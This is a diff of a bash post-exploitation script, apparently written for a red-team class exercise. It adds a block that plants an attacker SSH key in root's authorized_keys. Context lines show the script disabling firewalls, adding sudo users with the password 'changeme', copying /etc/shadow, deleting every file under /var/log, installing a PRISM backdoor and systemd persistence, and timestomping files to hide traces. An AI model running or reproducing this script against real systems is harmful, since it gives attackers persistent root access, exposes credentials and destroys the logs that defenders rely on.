@@ -13,6 +13,10 @@
 #	- Establish systemd persistence
 #	- Timestomp
 
+# Check sysv or systemd
+#pidof systemd && SYSD=1 || SYSD=0
+
+
 
 # Check Release to see if Ubuntu/CentOS
 if [[ -f /etc/centos-release ]]
@@ -29,14 +33,14 @@ then
 
 	# NEW
 	iptables -X &> /dev/null
-    	iptables -F &> /dev/null
-    	iptables -t nat -F &> /dev/null
-    	iptables -t nat -X &> /dev/null
-    	iptables -t mangle -F &> /dev/null
-    	iptables -t mangle -X &> /dev/null
+    iptables -F &> /dev/null
+	iptables -t nat -F &> /dev/null
+	iptables -t nat -X &> /dev/null
+	iptables -t mangle -F &> /dev/null
+	iptables -t mangle -X &> /dev/null
 	iptables -P INPUT ACCEPT &> /dev/null
-    	iptables -P FORWARD ACCEPT &> /dev/null
-    	iptables -P OUTPUT ACCEPT &> /dev/null
+	iptables -P FORWARD ACCEPT &> /dev/null
+	iptables -P OUTPUT ACCEPT &> /dev/null
 
 	# For the Newer versions
 	firewall-cmd stop &>/dev/null
@@ -59,25 +63,25 @@ then
 	
 	### DISABLE FIREWALL ON UBUNTU ###
 	iptables -X &> /dev/null
-        iptables -F &> /dev/null
-        iptables -t nat -F &> /dev/null
-        iptables -t nat -X &> /dev/null
-        iptables -t mangle -F &> /dev/null
-        iptables -t mangle -X &> /dev/null
-        iptables -P INPUT ACCEPT &> /dev/null
-        iptables -P FORWARD ACCEPT &> /dev/null
-        iptables -P OUTPUT ACCEPT &> /dev/null
+	iptables -F &> /dev/null
+	iptables -t nat -F &> /dev/null
+	iptables -t nat -X &> /dev/null
+	iptables -t mangle -F &> /dev/null
+	iptables -t mangle -X &> /dev/null
+	iptables -P INPUT ACCEPT &> /dev/null
+	iptables -P FORWARD ACCEPT &> /dev/null
+	iptables -P OUTPUT ACCEPT &> /dev/null
 
 	# UFW just in case...
 	ufw disable &>/dev/null
 	
 	### ADD USERS ###
-        useradd -G sudo jmorris &>/dev/null
-        echo "jmorris:changeme" | chpasswd &>/dev/null
-        useradd -G sudo tgoodman &>/dev/null
-        echo "tgoodman:changeme" | chpasswd &>/dev/null
-        useradd -G sudo bmiller &>/dev/null
-        echo "bmiller:changeme" | chpasswd &>/dev/null
+	useradd -G sudo jmorris &>/dev/null
+	echo "jmorris:changeme" | chpasswd &>/dev/null
+	useradd -G sudo tgoodman &>/dev/null
+	echo "tgoodman:changeme" | chpasswd &>/dev/null
+	useradd -G sudo bmiller &>/dev/null
+	echo "bmiller:changeme" | chpasswd &>/dev/null
 
 	## INSTALL STUFF ##
 	apt -y install nmap vim &>/dev/null
@@ -103,7 +107,7 @@ tar -cvf /tmp/l/keys.tar /tmp/jg
 mv /tmp/t /tmp/l/
 rm -rf /tmp/jg
 
-# COLLECT SENSITIVE CONFIGURATIONS
+# COLLECT SENSITIVE FILES
 cp /etc/passwd /tmp/l/p
 cp /etc/shadow /tmp/l/s
 cp /etc/group /tmp/l/g
@@ -215,34 +219,51 @@ echo "[!] SUID finished"
 #===============================================================================
 
 # DROP SSH KEYS
+
+## USERS
 for d in /home/*; do
 
 	if [ -d "$d"  ];
 	then
 		if ! [ -d "/home/$d/.ssh"  ];
 		then 
-				mkdir -p /home/$d/.ssh
-				chmod 700 /home/$d/.ssh 
+			mkdir -p /home/$d/.ssh
+			chmod 700 /home/$d/.ssh 
 		fi 
 
 		if ! [ -f "/home/$d/.ssh/authorized_keys" ];
 		then
-				touch /home/$d/.ssh/authorized_keys
-				chmod 644 /home/$d/.ssh/authorized_keys
+			touch /home/$d/.ssh/authorized_keys
+			chmod 644 /home/$d/.ssh/authorized_keys
 		fi
 		
 		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjx7//qwlI4IE4ZSrIvTT7D7ASiPeLIzl+0fVdBdbHVDSm+mIh7UQ9r5/d1XmUITWkFbk3KbrG7sJmeLjpd1vdsnr67qrs1dU4s4gHCN2rYeWt3dZxkUfLSjPCTx/Y2X1Itaa+Tdt33uEzuzxSnxCDlSKXAhP1+PedzVp/FsJKmbSaWsZeslLTssqBk4eiG0XIICG3dT0xDJyRmg1BXp1f9l7RvoDq3lAcPCOzg6bQc9U1sk+jinKaBwIEZWHazW+ZlQu4vw1ULTk7wQe87X5vVsPVbhBNaI4DZoWbzW3UizexHkn0RTQlydPEDbizVSUbnZ6hrOOSfBOqG4MM3pHBdIWu0gWnuo7d2CGFnlbMfaVQfhaZsKlU8KpIDZgOWD8gZoHI5xjh5bZEuPrsa2AGtwGoNWx4h9CedHfbb2J6O5YmxPrnL7baR7ofRiXnExvlo+xkS5BaQiAxEUZLjKRnGJZALdjDjLTY6Tt+/QH0+HJFaW6ePtdQIa9DAv7uGbU= moleary@classex.tu" >> /home/$d/.ssh/authorized_keys
 	fi
 done
 
+## ROOT
+if ! [ -d "/root/.ssh"  ];
+then 
+	mkdir -p /root/.ssh
+	chmod 700 /root/.ssh 
+fi 
+
+if ! [ -f "/root/.ssh/authorized_keys" ];
+then
+	touch /root/.ssh/authorized_keys
+	chmod 644 /root/.ssh/authorized_keys
+fi
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjx7//qwlI4IE4ZSrIvTT7D7ASiPeLIzl+0fVdBdbHVDSm+mIh7UQ9r5/d1XmUITWkFbk3KbrG7sJmeLjpd1vdsnr67qrs1dU4s4gHCN2rYeWt3dZxkUfLSjPCTx/Y2X1Itaa+Tdt33uEzuzxSnxCDlSKXAhP1+PedzVp/FsJKmbSaWsZeslLTssqBk4eiG0XIICG3dT0xDJyRmg1BXp1f9l7RvoDq3lAcPCOzg6bQc9U1sk+jinKaBwIEZWHazW+ZlQu4vw1ULTk7wQe87X5vVsPVbhBNaI4DZoWbzW3UizexHkn0RTQlydPEDbizVSUbnZ6hrOOSfBOqG4MM3pHBdIWu0gWnuo7d2CGFnlbMfaVQfhaZsKlU8KpIDZgOWD8gZoHI5xjh5bZEuPrsa2AGtwGoNWx4h9CedHfbb2J6O5YmxPrnL7baR7ofRiXnExvlo+xkS5BaQiAxEUZLjKRnGJZALdjDjLTY6Tt+/QH0+HJFaW6ePtdQIa9DAv7uGbU= moleary@classex.tu" >> /root/.ssh/authorized_keys
+
 echo "[!] SSHKEYS dropped"
+
+
 
 # LOGGER MCLOGGERSON MEANY PANTS MCGEE
 
 find /var/log -type f -delete
 cp /tmp/pwn/l3ts_g3t_fUnKii /var/log/
-
-
 
 # PRISM
 chmod 7700 ./fsdisk
@@ -258,6 +279,9 @@ cp ./udevd /sbin/
 /sbin/udevd
 
 echo "[!] PRISM dropped"
+
+
+
 
 # SYSTEMD PERSISTENCE
 chmod 777 ./developer-utility.service
@@ -276,6 +300,9 @@ systemctl start filesys.service
 systemctl enable filesys.service
 
 echo "[!] SYSTEMD set"
+
+
+
 
 #===============================================================================
 				# TIMESTOMP #
@@ -311,6 +338,8 @@ touch -m --date "2020-11-30 20:51:30" /sbin
 touch -a --date "2021-1-30 20:51:30" /etc/ssh
 touch -m --date "2021-1-30 20:51:30" /etc/ssh
 
+
+
 touch -a --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
 touch -m --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
 
@@ -326,6 +355,8 @@ touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/
 touch -a --date "2020-3-20 20:51:30" /etc/systemd/
 touch -m --date "2020-3-20 20:51:30" /etc/systemd/
 
+
+
 touch -a --date "2020-11-30 20:51:30" /etc
 touch -m --date "2020-11-30 20:51:30" /etc
 
@@ -333,6 +364,8 @@ for target in `find /home | grep .ssh`; do
 	touch -a --date "2020-1-27 13:06:01" $target
 	touch -m --date "2020-1-27 13:06:01" $target
 done
+
+
 
 echo "[!] TIMESTOMPd"
 
